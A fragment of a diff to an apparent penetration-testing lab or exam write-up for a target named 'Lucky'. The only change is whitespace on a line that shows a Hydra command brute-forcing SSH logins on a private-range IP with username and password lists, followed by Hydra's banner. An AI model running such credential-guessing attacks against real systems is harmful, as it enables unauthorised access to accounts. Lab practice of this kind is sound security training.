@@ -19,7 +19,7 @@ PORT   STATE SERVICE REASON  VERSION
 
 ```sh
 ┌──(koshi㉿kali)-[~/Exam/Lucky]
-└─$ hydra -L usernames.txt -P passwords.txt ssh://192.168.104.112                    
+	└─$ hydra -L usernames.txt -P passwords.txt ssh://192.168.104.112                    
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-23 10:35:58
